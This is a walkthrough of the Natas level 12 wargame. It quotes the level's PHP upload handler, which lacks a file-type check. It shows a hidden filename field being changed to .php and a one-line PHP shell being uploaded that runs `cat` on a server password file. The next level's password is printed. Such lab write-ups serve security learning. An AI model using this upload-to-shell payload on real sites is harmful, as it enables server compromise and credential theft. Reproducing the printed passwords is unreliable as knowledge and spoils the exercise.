# Natas Level 12

## 🧪 Credentials

- **URL**: `http://natas12.natas.labs.overthewire.org`
- **Username**: `natas12`
- **Password**: `yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB`

---

## 🖥️ Steps

1. Login to the website.
2. lets see the source. what does it do? we upload a file and the webserver saves it in the `/upload` dir with a random name. the code doesn't check if the uploaded file is a image or not so we can upload a script.
```
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```
3. first go to inspect elements. there is a `form` tag. in this there is an `input` which has a value of `bnx7gclgan.jpg` (yours will be different), change this to `bnx7gclgan.php` cause we want to upload a php file.
```
<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000">
<input type="hidden" name="filename" value="bnx7gclgan.jpg">
Choose a JPEG to upload (max 1KB):<br>
<input name="uploadedfile" type="file"><br>
<input type="submit" value="Upload File">
</form>
```
4. how let's write the script. i named it `natas12.php` an it contains this command `echo system(cat /etc/natas_webpass/natas13)`. this is the file's info
```
<?php
echo system('cat /etc/natas_webpass/natas13');
?>
```
5. and this is the pass after uploading and running it.
```
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```
---
